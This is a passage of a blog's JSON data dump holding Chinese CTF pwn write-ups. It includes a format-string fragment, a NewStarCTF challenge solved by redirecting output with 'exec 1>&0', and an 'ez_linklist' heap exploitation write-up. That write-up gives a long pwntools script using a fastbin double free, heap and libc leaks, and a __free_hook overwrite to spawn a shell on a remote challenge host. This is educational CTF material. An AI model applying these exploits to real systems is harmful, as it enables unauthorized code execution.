class=\"number\">10</span>,<span class=\"number\">0x400000</span>,<span class=\"number\">0x40006a</span>);</span><br></pre></td></tr></table></figure>\n<p>在上述例子中，第一个参数即为格式化字符串，其中的%d,%s,%x即为格式化字符</p>\n<p>第二、第三、第四个参数都是可变参数，按照顺序放入格式化字符的位置，并按照格式化字符解析<br>%d表示解析为10进制数、%x表示解析为16进制数、%s则将该参数视作指针，解析为该参数指向内存的内容，并以字符串的形式显示</p>\n<p>格式化字符串漏洞</p>\n<h2 id=\"利用格式化字符串漏洞进行泄露\"><a href=\"#利用格式化字符串漏洞进行泄露\" class=\"headerlink\" title=\"利用格式化字符串漏洞进行泄露\"></a>利用格式化字符串漏洞进行泄露</h2>","site":{"data":{}},"excerpt":"<p>格式化字符串漏洞是针对利用格式化字符串的函数（如printf、sprintf…）的漏洞<br>格式化字符串函数是一种具有可变参数的函数，其参数分为格式化字符串和可变参数两部分，可变参数的数量由格式化字符串中的格式化字符来决定</p>","more":"<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;number: %d, hex: %x, sth: %s&quot;</span>,<span class=\"number\">10</span>,<span class=\"number\">0x400000</span>,<span class=\"number\">0x40006a</span>);</span><br></pre></td></tr></table></figure>\n<p>在上述例子中，第一个参数即为格式化字符串，其中的%d,%s,%x即为格式化字符</p>\n<p>第二、第三、第四个参数都是可变参数，按照顺序放入格式化字符的位置，并按照格式化字符解析<br>%d表示解析为10进制数、%x表示解析为16进制数、%s则将该参数视作指针，解析为该参数指向内存的内容，并以字符串的形式显示</p>\n<p>格式化字符串漏洞</p>\n<h2 id=\"利用格式化字符串漏洞进行泄露\"><a href=\"#利用格式化字符串漏洞进行泄露\" class=\"headerlink\" title=\"利用格式化字符串漏洞进行泄露\"></a>利用格式化字符串漏洞进行泄露</h2>"},{"title":"closed","date":"2023-01-02T11:54:26.000Z","_content":"\nNewStarCTF，考察linux重定向机制\n<!-- more -->\n\n这题没必要查壳了，运行后会执行close(1)、close(2)，之后就会执行system(\"/bin/sh\")\n\n文件描述符0、1、2分别表示标准输入(stdin)、标准输出(stdout)和报错(stderr)，执行close()之后，对应的信息将不会显示出来。\n\n在此题中关闭了输出和报错这两个文件，因此我们即使得到了shell，由于stdout的文件关闭了，命令执行结果无法写入stdout，屏幕上自然不会有输出结果显示。\n\n不过如果把输出重定向，改变，就可以有输出结果显示了。\n\n**linux重定向机制**\n\n重定向就是**改变数据的流向**。重定向分为**输入重定向**和**输出重定向**，分别是改变输入数据和输出数据的流向，分别用<、<<,>,>>来表示。\n\n输入重定向，顾名思义是改变输入数据的流向（来源）。\n\n```\ncommand < filename  //通过这条命令，可以修改输入数据的来源，由键盘输入的缓冲区(stdin)修改为其他文件\ncommand << identifier(标识符)   //通过这条命令，可以修改键盘输入的结束符，由换行符修改为自定义的标识符\n```\n\n输出重定向，顾名思义是改变输出数据的流向（去向）。\n\n```\ncommand > filename  //通过这条命令，可以修改执行结果的去向，由显示器的缓冲区(stdout)修改为其他文件，会覆盖文件中原有的数据\ncommand >> filename //通过这条命令，可以修改执行结果的去向，由显示器的缓冲区(stdout)修改为其他文件，不会覆盖文件中原有的数据，而是在原有数据的末尾追加\ncommand 2 > filename    //将错误输出到文件中，2是stderr的文件描述符\ncommand 2 > &1  //将错误输出到标准输出的位置，1是stdout的文件描述符，其他同理\n```\n\nexp：\n\n```python\n\nfrom pwn import*\np=remote()\np.sendline(\"exec 1>&0\")\np.interactive()\n\n```","source":"_posts/closed.md","raw":"---\ntitle: closed\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- linux_trick\n\n---\n\nNewStarCTF，考察linux重定向机制\n<!-- more -->\n\n这题没必要查壳了，运行后会执行close(1)、close(2)，之后就会执行system(\"/bin/sh\")\n\n文件描述符0、1、2分别表示标准输入(stdin)、标准输出(stdout)和报错(stderr)，执行close()之后，对应的信息将不会显示出来。\n\n在此题中关闭了输出和报错这两个文件，因此我们即使得到了shell，由于stdout的文件关闭了，命令执行结果无法写入stdout，屏幕上自然不会有输出结果显示。\n\n不过如果把输出重定向，改变，就可以有输出结果显示了。\n\n**linux重定向机制**\n\n重定向就是**改变数据的流向**。重定向分为**输入重定向**和**输出重定向**，分别是改变输入数据和输出数据的流向，分别用<、<<,>,>>来表示。\n\n输入重定向，顾名思义是改变输入数据的流向（来源）。\n\n```\ncommand < filename  //通过这条命令，可以修改输入数据的来源，由键盘输入的缓冲区(stdin)修改为其他文件\ncommand << identifier(标识符)   //通过这条命令，可以修改键盘输入的结束符，由换行符修改为自定义的标识符\n```\n\n输出重定向，顾名思义是改变输出数据的流向（去向）。\n\n```\ncommand > filename  //通过这条命令，可以修改执行结果的去向，由显示器的缓冲区(stdout)修改为其他文件，会覆盖文件中原有的数据\ncommand >> filename //通过这条命令，可以修改执行结果的去向，由显示器的缓冲区(stdout)修改为其他文件，不会覆盖文件中原有的数据，而是在原有数据的末尾追加\ncommand 2 > filename    //将错误输出到文件中，2是stderr的文件描述符\ncommand 2 > &1  //将错误输出到标准输出的位置，1是stdout的文件描述符，其他同理\n```\n\nexp：\n\n```python\n\nfrom pwn import*\np=remote()\np.sendline(\"exec 1>&0\")\np.interactive()\n\n```","slug":"closed","published":1,"updated":"2023-01-02T16:10:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafv003a5oudb502c4w5","content":"<p>NewStarCTF，考察linux重定向机制</p>\n<span id=\"more\"></span>\n\n<p>这题没必要查壳了，运行后会执行close(1)、close(2)，之后就会执行system(“/bin/sh”)</p>\n<p>文件描述符0、1、2分别表示标准输入(stdin)、标准输出(stdout)和报错(stderr)，执行close()之后，对应的信息将不会显示出来。</p>\n<p>在此题中关闭了输出和报错这两个文件，因此我们即使得到了shell，由于stdout的文件关闭了，命令执行结果无法写入stdout，屏幕上自然不会有输出结果显示。</p>\n<p>不过如果把输出重定向，改变，就可以有输出结果显示了。</p>\n<p><strong>linux重定向机制</strong></p>\n<p>重定向就是<strong>改变数据的流向</strong>。重定向分为<strong>输入重定向</strong>和<strong>输出重定向</strong>，分别是改变输入数据和输出数据的流向，分别用&lt;、&lt;&lt;,&gt;,&gt;&gt;来表示。</p>\n<p>输入重定向，顾名思义是改变输入数据的流向（来源）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command &lt; filename  //通过这条命令，可以修改输入数据的来源，由键盘输入的缓冲区(stdin)修改为其他文件</span><br><span class=\"line\">command &lt;&lt; identifier(标识符)   //通过这条命令，可以修改键盘输入的结束符，由换行符修改为自定义的标识符</span><br></pre></td></tr></table></figure>\n\n<p>输出重定向，顾名思义是改变输出数据的流向（去向）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command &gt; filename  //通过这条命令，可以修改执行结果的去向，由显示器的缓冲区(stdout)修改为其他文件，会覆盖文件中原有的数据</span><br><span class=\"line\">command &gt;&gt; filename //通过这条命令，可以修改执行结果的去向，由显示器的缓冲区(stdout)修改为其他文件，不会覆盖文件中原有的数据，而是在原有数据的末尾追加</span><br><span class=\"line\">command 2 &gt; filename    //将错误输出到文件中，2是stderr的文件描述符</span><br><span class=\"line\">command 2 &gt; &amp;1  //将错误输出到标准输出的位置，1是stdout的文件描述符，其他同理</span><br></pre></td></tr></table></figure>\n\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">p=remote()</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;exec 1&gt;&amp;0&quot;</span>)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>NewStarCTF，考察linux重定向机制</p>","more":"<p>这题没必要查壳了，运行后会执行close(1)、close(2)，之后就会执行system(“/bin/sh”)</p>\n<p>文件描述符0、1、2分别表示标准输入(stdin)、标准输出(stdout)和报错(stderr)，执行close()之后，对应的信息将不会显示出来。</p>\n<p>在此题中关闭了输出和报错这两个文件，因此我们即使得到了shell，由于stdout的文件关闭了，命令执行结果无法写入stdout，屏幕上自然不会有输出结果显示。</p>\n<p>不过如果把输出重定向，改变，就可以有输出结果显示了。</p>\n<p><strong>linux重定向机制</strong></p>\n<p>重定向就是<strong>改变数据的流向</strong>。重定向分为<strong>输入重定向</strong>和<strong>输出重定向</strong>，分别是改变输入数据和输出数据的流向，分别用&lt;、&lt;&lt;,&gt;,&gt;&gt;来表示。</p>\n<p>输入重定向，顾名思义是改变输入数据的流向（来源）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command &lt; filename  //通过这条命令，可以修改输入数据的来源，由键盘输入的缓冲区(stdin)修改为其他文件</span><br><span class=\"line\">command &lt;&lt; identifier(标识符)   //通过这条命令，可以修改键盘输入的结束符，由换行符修改为自定义的标识符</span><br></pre></td></tr></table></figure>\n\n<p>输出重定向，顾名思义是改变输出数据的流向（去向）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command &gt; filename  //通过这条命令，可以修改执行结果的去向，由显示器的缓冲区(stdout)修改为其他文件，会覆盖文件中原有的数据</span><br><span class=\"line\">command &gt;&gt; filename //通过这条命令，可以修改执行结果的去向，由显示器的缓冲区(stdout)修改为其他文件，不会覆盖文件中原有的数据，而是在原有数据的末尾追加</span><br><span class=\"line\">command 2 &gt; filename    //将错误输出到文件中，2是stderr的文件描述符</span><br><span class=\"line\">command 2 &gt; &amp;1  //将错误输出到标准输出的位置，1是stdout的文件描述符，其他同理</span><br></pre></td></tr></table></figure>\n\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">p=remote()</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;exec 1&gt;&amp;0&quot;</span>)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"ez_linklist","date":"2023-01-02T11:54:26.000Z","_content":"\n在链表中非常复杂的fast bin double free。\n<!-- more -->\n\n64位菜单题，大部分保护都开了\n\n里面有个链表的数组chunk_list，还有记录每个链表中节点个数的数组chunk_num。\n\n```c\nstruct node    //固定0x18大小\n{\n    node* next;    //指向下一个node\n    int size;    //content的chunk的user size,size<=0x70\n    _Qword* content;    //content指针，指向malloc(size)\n}\n```\n\n大概有4个功能，增加结点(add)、删除结点(delete)、连接(link)、解除连接(unlink)\n\nadd是创建一个node以及其content，在chunk_list中找到一个idx最小的空位，将node放到那里。\n\ndelete有两种模式，如果输入的offset==255,那么则是把这一条链表的node及其content从头到尾进行free，否则是free该链表的第offset个node和content。delete处存在UAF，如果offset!=255，free后的node中仍保存着content指针,并且content内容不会改变。\n\nlink是将两个chunk_list连接在一起，dest_list会链接到src_list的末尾，并且chunk_list[dest]=0，让它指向空。\n\nunlink是根据offset将一个chunk从chunk_list中取出，第offset个chunk会成为idx最小的空chunk_list的第1个chunk，**但是分出去的chunk的next部分没有清空，仍然指向原来后续的chunk**。除此之外，unlink会**输出**该chunk_list下所有chunk的content，可以用来泄露。\n\nexp:\n\n```python\n\nfrom pwn import *\ncontext(os = 'linux',arch = 'amd64',log_level = 'debug')\nelf = ELF(\"./pwn\")\nlibc = ELF(\"./libc.so.6\")\n#p = process(\"./pwn\")  \np = remote(\"tcp.dasc.buuoj.cn\", 24502)\n\ndef add(size,content):\n    p.recvuntil(\"Your choice:\\n\")\n    p.sendline(str(1))\n    p.recvuntil(\"Size:\\n\")\n    p.sendline(str(size))\n    p.recvuntil(\"Content:\\n\")\n    p.send(content)\n\ndef dele(idx,offset):\n    p.recvuntil(\"Your choice:\\n\")\n    p.sendline(str(2))\n    p.recvuntil(\"Index\\n\")\n    p.sendline(str(idx))\n    p.recvuntil(\"Input offset:\\n\")\n    p.sendline(str(offset))\n\ndef link(src,dest):\n    p.recvuntil(\"Your choice:\\n\")\n    p.sendline(str(3))\n    p.recvuntil(\"link from:\\n\")\n    p.sendline(str(src))\n    p.recvuntil(\"link to:\\n\")\n    p.sendline(str(dest))\n\ndef unlink(idx,offset):\n    p.recvuntil(\"Your choice:\\n\")\n    p.sendline(str(4))\n    p.recvuntil(\"Index:\\n\")\n    p.sendline(str(idx))\n    p.recvuntil(\"Input offset:\\n\")\n    p.sendline(str(offset))\n\nfor i in range(6):\n    add(0x40,'a'*0x8)#0,1,2,3,4,5\n\n#list[0]:0=>1=>2\n#list[3]:3=>4=>5\nlink(0,1)\nlink(0,2)\nlink(3,4)\nlink(3,5)\n\n#list[0]:0=>2\n#list[1]:1=>2\n#list[3]:3=>4=>5\nunlink(0,1)\n\n#fill tcache and add chunk13\nfor i in range(8):\n    add(0x40,'a'*0x8)#chunk6~13,idx == 2,4,5,6,7,8,9,10\n\n#list[0]:0=>2\n#list[1]:1=>2\n#list[2]:6\n#list[3]:3=>4=>5\n#list[4]:7\n#list[5]:8\n#list[6]:9\n#list[7]:10\n#list[8]:11\n#list[9]:12\n#list[10]:13\n\ndele(2,0)\ndele(4,0)\ndele(5,0)\ndele(6,0)\ndele(7,0)\ndele(8,0)\ndele(9,0)\n\n#double free\n#fast bin :\n#2=>1=>2\ndele(0,1)\ndele(1,255)\n\n#list[0]:0\n#list[1]:null\n#list[2]:null\n#list[3]:3=>4=>5\n#list[4]:null\n#list[5]:null\n#list[6]:null\n#list[7]:null\n#list[8]:null\n#list[9]:null\n#list[10]:13\n\n#clear tcache\nfor i in range(7):\n    add(0x40,'a'*0x8)#idx=1,2,4,5,6,7,8\n\n#fast bins to tcache\n#tcache:\n#2=>1=>2\n\n# fastbins chunk2=>chunk1=>chunk2\n# 0x20: 0x5631022d53c0 —▸ 0x5631022d5350 ◂— 0x5631022d53c0\n# 0x50: 0x5631022d5370 —▸ 0x5631022d5300 ◂— 0x5631022d5370\n#reset the fd of content2\nadd(0x40,'\\x00')#idx=9 chunk2\n#after this work, chunk1=>chunk2=>0x0(next=0 in function add())\n#but in content, we only write a lowbyte '\\x00' in the fd\n#so it change from 0x5631022d5300 to 0x5631022d5300  (如果最低位不是\\x00也会变为\\x00)\n#when malloc , chunks in fast bins transfer to tcachebins\n# tcachebins chunk1=>chunk2\n# 0x20 [  3]: 0x5631022d5360 —▸ 0x5631022d53d0 ◂— 0x0(next have clear in add())\n# 0x50 [  3]: 0x5631022d5310 —▸ 0x5631022d5380 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...\n\n#list[0]:0\n#list[1]:6\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:2\n#list[10]:13\n\n#list[9]: 2=>13\nlink(9,10)\n\nadd(0x40,'b'*0x8)#idx=10 chunk1\nadd(0x40,'b'*0x8)#idx=11 chunk2\n\nlink(0,9)\nlink(1,11)\n\n#list[0]:0=>2=>13\n#list[1]:6=>2\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:null\n#list[10]:1\n#list[11]:null\n\n#dele chunk1 and chunk2\ndele(10,0)\ndele(1,1)\n#after dele chunk1 and chunk2\n# tcachebins : chunk2=>chunk1\n# 0x20 [  3]: 0x5631022d53d0 —▸ 0x5631022d5360 —▸ 0x5631022d58a0 ◂— 0x0 link chunk2 and chunk13 so next->chunk13\n# 0x50 [  3]: 0x5631022d5380 —▸ 0x5631022d5310 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...(2a0是pre_size，也就是chunk0的content)\n\n#list[0]:0=>2=>13\n#list[1]:6\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:null\n#list[10]:null\n#list[11]:null\n\np.recvuntil(\"Your choice:\\n\")\np.sendline(str(4))\np.recvuntil(\"Index:\\n\")\np.sendline(str(0))\n\n#leak heap base by chunk2_content.fd(chunk1_content) - offset.\np.recvuntil(\"Offset 1:\")\nheap_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x310\n# log.info(\"heap_base : \" + hex(heap_base))\np.recvuntil(\"Input offset:\\n\")\np.sendline(str(1))\n\n#list[0]:0=>13\n#list[1]:6\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:2\n#list[10]:null\n#list[11]:null\n\nadd(0x40,'a'*0x8)#idx=10 chunk2\n\nadd(0x40,'a'*0x8)#idx=11 chunk1\n\n#list[0]:0=>2=>13\n#list[1]:6\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:2\n#list[10]:2\n#list[11]:1\n\n#set idx 11 size , to get unsorted bin\npayload = p64(heap_base + 0x2a0) + p64(0x441) + b'aaaaaaaa'(+0x2a0是为了保持原来的数据)\nadd(0x40,payload)#idx=12 0x5631022d58a0 -> content == 0x5631022d52f0\n#now the size of chunk1 is 0x441 , prev_size =0x5631022d52a0(chunk0的content)\n#add后 0x50 [  0]: 0x5631022d52a0 ◂— ...(chunk0的content)导致的free，但实际上没执行free\n#unsorted bin\ndele(11,0)\n\n# unsortedbin\n# all: 0x5631022d5300 —▸ 0x7f1998a0bbe0 (main_arena+96) ◂— 0x5631022d5300\n# 0x5631022d5300:\t0x00005631022d52a0\t0x0000000000000441\n# 0x5631022d5310:\t0x00007f1998a0bbe0\t0x00007f1998a0bbe0\n#修改了size之后，后续9个chunk（含content）和1个content也被包含在chunk1的content中\n#即一直到chun10的content都被包含了，chunk10本体并没有\n\nadd(0x60,'a'*0x8) #idx=11\n#从chunk1 size==0x441的bin中切割出size==0x71的chunk作为content\n\n#unlink to leak\nlink(1,10)\n\n#list[0]:0=>2=>13\n#list[1]:6=>2\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:2\n#list[10]:null\n#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）\n#list[12]:14\n\np.recvuntil(\"Your choice:\\n\")\np.sendline(str(4))\np.recvuntil(\"Index:\\n\")\np.sendline(str(1))\n\n#leak libc base\n#此时原来chunk2的content在0x3d1大小的chunk的起始位置\n#通过unlink输出content中的unsortbin头\np.recvuntil(\"Offset 1:\")\nlibc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 96 - 0x10 - libc.symbols['__malloc_hook']\nfree_hook = libc_base + libc.symbols['__free_hook']\none_gadget = 0xe6c81\none_gadget_addr = libc_base + one_gadget\n# log.info(\"libc_base : \" + hex(libc_base))\n# log.info(\"free_hook : \" + hex(free_hook))\n# log.info(\"one_gadget_addr : \" + hex(one_gadget_addr))\n# log.info(\"heap_base : \" + hex(heap_base))\np.recvuntil(\"Input offset:\\n\")\np.sendline(str(1))\n\n#fill of tcache\ndele(0,0)\ndele(1,0)\ndele(2,0)\ndele(4,0)\ndele(5,0)\ndele(6,0)\ndele(7,0)\n#11=>10=>9=>8=>7=>6=>0\n\n#use list[3]\nunlink(3,1)\n\n#double free\ndele(3,1)\ndele(1,255)\n#fast bin5=>4=>5\n# 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510\n# 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0\n\n\n#list[0]:2=>13\n#list[1]:null\n#list[2]:null\n#list[3]:3\n#list[4]:null\n#list[5]:null\n#list[6]:null\n#list[7]:null\n#list[8]:null\n#list[9]:2\n#list[10]:2\n#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）\n#list[12]:14\n\nfor i in range(7):\n    add(0x40,'a'*0x8)\n\nlink(1,10)\nlink(1,11)\nlink(1,12)\nlink(1,13)\n\n#list[0]:2=>13=>2=>1=>14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）\n#list[1]:11\n#list[2]:10\n#list[3]:3\n#list[4]:9\n#list[5]:8\n#list[6]:7\n#list[7]:6\n#list[8]:0\n#list[9]:2\n#list[10]:null\n#list[11]:null\n#list[12]:null\n\n#fast bin5=>4=>5\n# 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510\n# 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0\n#通过double free 后的add修改tcache的指针指向\nadd(0x40,p64(free_hook) + b'aaaa')#5\n\n\nlink(10,9)\n\n# tcachebins\n# 0x20 [  3]: 0x5631022d54b0 —▸ 0x5631022d5520 ◂— 0x0\n# 0x50 [  4]: 0x5631022d52b0 —▸ 0x5631022d5460 —▸ 0x5631022d54d0 —▸ 0x7f1998a0de48 (__free_hook) ◂— 0x0\n#连续申请4个来改写__free_hook,tcache不会检查size\nadd(0x40,p64(free_hook) + b'aaaa')#4\nadd(0x40,p64(free_hook) + b'aaaa')#5\nadd(0x40,p64(free_hook) + b'aaaa')#15\n\nadd(0x40,p64(one_gadget_addr) + b'aaaa')#16\n\n#list[0]:2=>13=>2=>1=>14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）\n#list[1]:11\n#list[2]:10\n#list[3]:3\n#list[4]:9\n#list[5]:8\n#list[6]:7\n#list[7]:6\n#list[8]:0\n#list[9]:4\n#list[10]:5=>2\n#list[11]:5\n#list[12]:15\n#list[13]:16\n\n#调用free,执行one_gadget\np.recvuntil(\"Your choice:\\n\")\np.sendline(str(2))\np.recvuntil(\"Index\\n\")\np.sendline(str(0))\np.recvuntil(\"Input offset:\\n\")\np.sendline(str(0))\n\n\np.interactive()\n```\n","source":"_posts/ez_linklist.md","raw":"---\ntitle: ez_linklist\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n---\n\n在链表中非常复杂的fast bin double free。\n<!-- more -->\n\n64位菜单题，大部分保护都开了\n\n里面有个链表的数组chunk_list，还有记录每个链表中节点个数的数组chunk_num。\n\n```c\nstruct node    //固定0x18大小\n{\n    node* next;    //指向下一个node\n    int size;    //content的chunk的user size,size<=0x70\n    _Qword* content;    //content指针，指向malloc(size)\n}\n```\n\n大概有4个功能，增加结点(add)、删除结点(delete)、连接(link)、解除连接(unlink)\n\nadd是创建一个node以及其content，在chunk_list中找到一个idx最小的空位，将node放到那里。\n\ndelete有两种模式，如果输入的offset==255,那么则是把这一条链表的node及其content从头到尾进行free，否则是free该链表的第offset个node和content。delete处存在UAF，如果offset!=255，free后的node中仍保存着content指针,并且content内容不会改变。\n\nlink是将两个chunk_list连接在一起，dest_list会链接到src_list的末尾，并且chunk_list[dest]=0，让它指向空。\n\nunlink是根据offset将一个chunk从chunk_list中取出，第offset个chunk会成为idx最小的空chunk_list的第1个chunk，**但是分出去的chunk的next部分没有清空，仍然指向原来后续的chunk**。除此之外，unlink会**输出**该chunk_list下所有chunk的content，可以用来泄露。\n\nexp:\n\n```python\n\nfrom pwn import *\ncontext(os = 'linux',arch = 'amd64',log_level = 'debug')\nelf = ELF(\"./pwn\")\nlibc = ELF(\"./libc.so.6\")\n#p = process(\"./pwn\")  \np = remote(\"tcp.dasc.buuoj.cn\", 24502)\n\ndef add(size,content):\n    p.recvuntil(\"Your choice:\\n\")\n    p.sendline(str(1))\n    p.recvuntil(\"Size:\\n\")\n    p.sendline(str(size))\n    p.recvuntil(\"Content:\\n\")\n    p.send(content)\n\ndef dele(idx,offset):\n    p.recvuntil(\"Your choice:\\n\")\n    p.sendline(str(2))\n    p.recvuntil(\"Index\\n\")\n    p.sendline(str(idx))\n    p.recvuntil(\"Input offset:\\n\")\n    p.sendline(str(offset))\n\ndef link(src,dest):\n    p.recvuntil(\"Your choice:\\n\")\n    p.sendline(str(3))\n    p.recvuntil(\"link from:\\n\")\n    p.sendline(str(src))\n    p.recvuntil(\"link to:\\n\")\n    p.sendline(str(dest))\n\ndef unlink(idx,offset):\n    p.recvuntil(\"Your choice:\\n\")\n    p.sendline(str(4))\n    p.recvuntil(\"Index:\\n\")\n    p.sendline(str(idx))\n    p.recvuntil(\"Input offset:\\n\")\n    p.sendline(str(offset))\n\nfor i in range(6):\n    add(0x40,'a'*0x8)#0,1,2,3,4,5\n\n#list[0]:0=>1=>2\n#list[3]:3=>4=>5\nlink(0,1)\nlink(0,2)\nlink(3,4)\nlink(3,5)\n\n#list[0]:0=>2\n#list[1]:1=>2\n#list[3]:3=>4=>5\nunlink(0,1)\n\n#fill tcache and add chunk13\nfor i in range(8):\n    add(0x40,'a'*0x8)#chunk6~13,idx == 2,4,5,6,7,8,9,10\n\n#list[0]:0=>2\n#list[1]:1=>2\n#list[2]:6\n#list[3]:3=>4=>5\n#list[4]:7\n#list[5]:8\n#list[6]:9\n#list[7]:10\n#list[8]:11\n#list[9]:12\n#list[10]:13\n\ndele(2,0)\ndele(4,0)\ndele(5,0)\ndele(6,0)\ndele(7,0)\ndele(8,0)\ndele(9,0)\n\n#double free\n#fast bin :\n#2=>1=>2\ndele(0,1)\ndele(1,255)\n\n#list[0]:0\n#list[1]:null\n#list[2]:null\n#list[3]:3=>4=>5\n#list[4]:null\n#list[5]:null\n#list[6]:null\n#list[7]:null\n#list[8]:null\n#list[9]:null\n#list[10]:13\n\n#clear tcache\nfor i in range(7):\n    add(0x40,'a'*0x8)#idx=1,2,4,5,6,7,8\n\n#fast bins to tcache\n#tcache:\n#2=>1=>2\n\n# fastbins chunk2=>chunk1=>chunk2\n# 0x20: 0x5631022d53c0 —▸ 0x5631022d5350 ◂— 0x5631022d53c0\n# 0x50: 0x5631022d5370 —▸ 0x5631022d5300 ◂— 0x5631022d5370\n#reset the fd of content2\nadd(0x40,'\\x00')#idx=9 chunk2\n#after this work, chunk1=>chunk2=>0x0(next=0 in function add())\n#but in content, we only write a lowbyte '\\x00' in the fd\n#so it change from 0x5631022d5300 to 0x5631022d5300  (如果最低位不是\\x00也会变为\\x00)\n#when malloc , chunks in fast bins transfer to tcachebins\n# tcachebins chunk1=>chunk2\n# 0x20 [  3]: 0x5631022d5360 —▸ 0x5631022d53d0 ◂— 0x0(next have clear in add())\n# 0x50 [  3]: 0x5631022d5310 —▸ 0x5631022d5380 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...\n\n#list[0]:0\n#list[1]:6\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:2\n#list[10]:13\n\n#list[9]: 2=>13\nlink(9,10)\n\nadd(0x40,'b'*0x8)#idx=10 chunk1\nadd(0x40,'b'*0x8)#idx=11 chunk2\n\nlink(0,9)\nlink(1,11)\n\n#list[0]:0=>2=>13\n#list[1]:6=>2\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:null\n#list[10]:1\n#list[11]:null\n\n#dele chunk1 and chunk2\ndele(10,0)\ndele(1,1)\n#after dele chunk1 and chunk2\n# tcachebins : chunk2=>chunk1\n# 0x20 [  3]: 0x5631022d53d0 —▸ 0x5631022d5360 —▸ 0x5631022d58a0 ◂— 0x0 link chunk2 and chunk13 so next->chunk13\n# 0x50 [  3]: 0x5631022d5380 —▸ 0x5631022d5310 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...(2a0是pre_size，也就是chunk0的content)\n\n#list[0]:0=>2=>13\n#list[1]:6\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:null\n#list[10]:null\n#list[11]:null\n\np.recvuntil(\"Your choice:\\n\")\np.sendline(str(4))\np.recvuntil(\"Index:\\n\")\np.sendline(str(0))\n\n#leak heap base by chunk2_content.fd(chunk1_content) - offset.\np.recvuntil(\"Offset 1:\")\nheap_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x310\n# log.info(\"heap_base : \" + hex(heap_base))\np.recvuntil(\"Input offset:\\n\")\np.sendline(str(1))\n\n#list[0]:0=>13\n#list[1]:6\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:2\n#list[10]:null\n#list[11]:null\n\nadd(0x40,'a'*0x8)#idx=10 